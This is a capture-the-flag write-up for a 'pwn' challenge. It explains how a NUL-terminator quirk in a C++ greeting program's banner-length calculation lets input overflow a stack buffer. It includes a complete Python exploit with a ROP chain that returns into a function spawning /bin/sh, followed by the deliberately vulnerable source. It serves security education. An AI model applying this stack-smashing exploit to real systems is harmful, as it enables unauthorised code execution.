@@ -1,0 +1,220 @@
+Krampus wanted to redeem himself for all the bad he has done across the years.
+He wrote you [a] small program to craft the best Christmas greetings.  He might
+need to brush up his C++ skill though.
+
+Category:       pwn (438 points)
+Chall author:   tomadimitrie
+Writeup author: malfurious
+
+
+
+This challenge provides C++ source code for the vulnerable program (and a build
+for reference).  See the original source attached below this writeup.  The clear
+intent of the program is to take a string from the user and display it back to
+them in a generated banner (lines containing a repeated character are added
+above and below the echoed string).  However, the way the program goes about
+calculating the length of these 'banner border lines' is interesting...
+
+The program first asks for the single character to be repeated, then prompts for
+a series of symbols (which come from a simple alphabet "ABCDEF").  The symbols
+given by the user influence the total length of the border lines.  After doing
+this calculation, another function is called (GenerateGreeting) which actually
+renders the output in a stack buffer; this is where the string to be echoed is
+collected as well.
+
+The stack buffer that we build the output in is 2312 bytes in length (2336 bytes
+from the stack frame base, according to r2).  Only 128 bytes are read for the
+echoed string, so we need to get the calculated banner string length close to
+this size, so that we can use the direct message read to place our custom return
+address on the stack.
+
+
+
+Pattern count algorithm
+-----------------------
+As mentioned earlier, a series of symbols determines the length of the repeated
+character banner lines.  The logic dictating this is as follows:
+
+    - each character from the SYMBOLS string ("ABCDEF") corresponds to a power
+      of 3:
+
+        A: 1
+        B: 3
+        C: 9
+        D: 27
+        ...
+
+    - each character occurrence in the user input contributes that power to the
+      total.  Put another way, the some of all like-symbols is the multiple of
+      that power:
+
+        AABBC -> 2(A) 2(B) 1(C) -> 2*1 + 2*3 + 9 -> length = 17
+
+    - each symbol can appear no more than 3 times in the input
+
+However, there is a problem.  Even if we give symbols for the largest possible
+string according to these rules ("AAABBBCCCDDDEEEFFF") (the order doesn't
+matter), we will only produce a banner of length 1092.  This banner is included
+in the output twice, along with our echoed string which is a max of 128 bytes.
+This is 2313 bytes exactly, the defined length of the output buffer in the C++
+code.
+
+The trick is to utilize the implicit NULL-byte character that is placed at the
+end of the SYMBOLS string constant used by the code (sizeof("ABCDEF") == 7)!
+This would make any input NULL bytes equivalent to 3^6 or 729 under these rules,
+allowing us to easily smash the stack.
+
+You'll see a helper function in my exploit code that calculates a suitable
+symbol sequence from a desired banner length.  In practice, the sequence I send
+is:
+
+    "\x00\x00\x00EDCCBB"
+
+
+
+Exploit
+-------
+With a method for smashing the stack in hand, let's move on to crafting our
+exploit.  The payload itself doesn't need to be too complicated, as the binary
+gives us a convenient 'win' function to jump into (it's called "Flag", and just
+calls system("/bin/sh")).
+
+During experimentation, I found that the memory near the bottom of the stack
+frame can't just be carelessly blown away.  Setting it all to 0x00 seems to
+be ok, but using much higher valued bytes can lead to a crash.  This chunk of
+stack memory is written by the banner generation, so I can't just use 0x00 as
+the byte to be repeated (as scanf("%c") disallow this).  Instead I use another
+arbitrary value as the repeated byte, but stop a little bit earlier at a
+slightly smaller target banner length (in practice, the ideal length - 16).  I
+then just pad up my stack smash payload (with zeroes) to account for this.
+
+I pad out my write for the "symbol sequence" read with 0xff bytes, since 0x00
+corresponds to a valid symbol input (and I can only have 3 of them).
+
+The actual stack smash (a small ROP chain) requires a visit to one 'ret' gadget
+to fixup stack alighment before returning to the Flag function, where we get a
+shell.
+
+
+
+Solution (Python/sploit)
+------------------------
+#!/usr/bin/env sploit
+from sploit.payload import *
+
+def writefixed(data, size, pc):
+    if len(data) > size:
+        raise Exception("data too big for fixed write")
+    gap = size-len(data)
+    data += pc*gap
+    io.write(data)
+
+def getsymbols(n):
+    chars = [ b'\x00', b'F', b'E', b'D', b'C', b'B', b'A' ]
+    pows = [ pow(3, n) for n in reversed(range(len(chars))) ]
+    res = b''
+
+    for c, p in zip(chars, pows):
+        x, n = divmod(n, p)
+        res += c * x
+
+    return res
+
+flag    =  0x4011e7  # flag win function
+ret     =  0x40131d  # ret gadget (stack alignment)
+pad     = (0x7fffffffdfa0-0x7fffffffd680)-17 # Sub 1 for '\n', Sub 16 for (see below)
+
+# It's important to keep the space near the base of the frame zero,
+# or else things wont work.  However, we can't use \x00 for the scanf
+# write below, so just stop the symbol banner early and pad out the
+# smash payload a little bit.
+
+symbols = getsymbols(pad)
+smash   = Payload().rep(b'\x00', 16).sbp().ret(ret).ret(flag)
+
+io.write(Payload.MAGIC)             # scanf %c
+io.write(b'\n')                     # getchar
+writefixed(symbols, 511, b'\xff')   # read(numberString)
+writefixed(smash(), 128, b'\x00')   # read(&output[cursor])
+io.interact()
+
+
+
+Original source (C++)
+---------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void Setup() {
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+#define SYMBOLS "ABCDEF"
+
+__attribute__((used, hot, noinline))
+void Flag() {
+  system("/bin/sh");
+}
+
+void GenerateGreeting(
+  char patternSymbol,
+  int patternCount
+) {
+  char output[2312] = { 0 };
+  int outputCursor = 0;
+  for (int i = 0; i < patternCount; i += 1) {
+    output[outputCursor++] = patternSymbol;
+  }
+  output[outputCursor++] = '\n';
+
+  printf("enter greeting: \n");
+  outputCursor += read(0, &output[outputCursor], 128);
+
+  for (int i = 0; i < patternCount; i += 1) {
+    output[outputCursor++] = patternSymbol;
+  }
+  output[outputCursor++] = '\n';
+
+  printf("%s\n", output);
+}
+
+int main() {
+  Setup();
+
+  printf("enter pattern character: \n");
+  char patternSymbol;
+  scanf("%c", &patternSymbol);
+  getchar();
+
+  printf("enter number of symbols: \n");
+  char numberString[512];
+  int readAmount = read(0, numberString, sizeof(numberString) - 1);
+  numberString[readAmount] = '\0';
+
+  int mappings[sizeof(SYMBOLS)] = { 0 };
+  for (int i = 0; i < readAmount; i += 1) {
+    char current = numberString[i];
+    int index = 0;
+    for (const auto symbol: SYMBOLS) {
+      if (current == symbol) {
+        mappings[index] += 1;
+      }
+      index += 1;
+    }
+  }
+
+  int patternCount = 0;
+  int power = 1;
+  for (int i = 0; i < sizeof(SYMBOLS); ++i) {
+    if (mappings[i] > 3) {
+      abort();
+    }
+    patternCount += power * mappings[i];
+    power *= 3;
+  }
+
+  GenerateGreeting(patternSymbol, patternCount);
+}
